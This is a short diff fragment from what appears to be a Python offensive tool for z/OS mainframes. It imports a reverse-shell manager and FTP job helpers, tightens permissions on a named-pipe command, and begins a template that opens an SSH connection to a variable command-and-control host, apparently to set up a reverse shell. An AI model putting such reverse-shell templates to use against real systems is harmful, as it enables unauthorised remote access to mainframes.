@@ -11,7 +11,7 @@ from sshutils import ssh_utils
 from zosutils import FTP, Job
 from reverseshellmanager import ReverseShellManager
 
-MKFIFO = 'SH mkfifo $FIFONAME'
+MKFIFO = 'SH mkfifo $FIFONAME; chmod 600 $FIFONAME'
 
 REVERSE_SH_SSH_TO_FILE = '''SH echo '
 ssh -i $KEYNAME $CCU@$CCS -p $CCP
